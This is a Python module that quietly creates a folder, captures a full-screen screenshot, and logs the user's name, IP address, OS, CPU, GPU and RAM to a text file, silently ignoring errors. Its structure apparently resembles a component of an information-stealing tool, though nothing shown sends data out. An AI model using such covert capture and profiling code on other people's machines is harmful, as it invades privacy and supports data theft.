from wmi import WMI
from mss import mss
from os import mkdir
from getpass import getuser
from socket import gethostbyname, gethostname


class System:

    def __init__(self, storage_path: str, storage_folder: str, folder: str, errors: bool):

        self.storage_path = storage_path
        self.storage_folder = storage_folder
        self.folder = folder
        self.errors = errors

    def __create_folder(self):

        mkdir(f"{self.storage_path}{self.storage_folder}{self.folder}")

    def __create_screen(self):

        with mss() as screen:
            screen.shot(mon=-1, output=f"{self.storage_path}{self.storage_folder}{self.folder}/screenshot.png")

    def __get_system_info(self):

        computer = WMI()

        os_info = computer.Win32_OperatingSystem()[0]
        cpu_info = computer.Win32_Processor()[0]
        gpu_info = computer.Win32_VideoController()[0]

        info = [
            f"User: {getuser()}\n",
            f"IP: {gethostbyname(gethostname())}\n",
            f"OS Name: {os_info.Name.split('|')[0]}\n",
            f"OS Version: {' '.join([os_info.Version, os_info.BuildNumber])}\n",
            f"CPU: {cpu_info.Name}\n",
            f"GPU: {gpu_info.Name}\n",
            f"RAM: {round(float(os_info.TotalVisibleMemorySize) / 1048576)} GB\n"
        ]

        with open(f"{self.storage_path}{self.storage_folder}{self.folder}/System.txt", "a", encoding='utf-8') as system:

            for item in info:

                system.write(item)

    def run(self):

        try:

            self.__create_folder()
            self.__create_screen()
            self.__get_system_info()

        except Exception as e:

            if self.errors is True:

                print(f"[SYSTEM]: {repr(e)}")

            else:

                pass
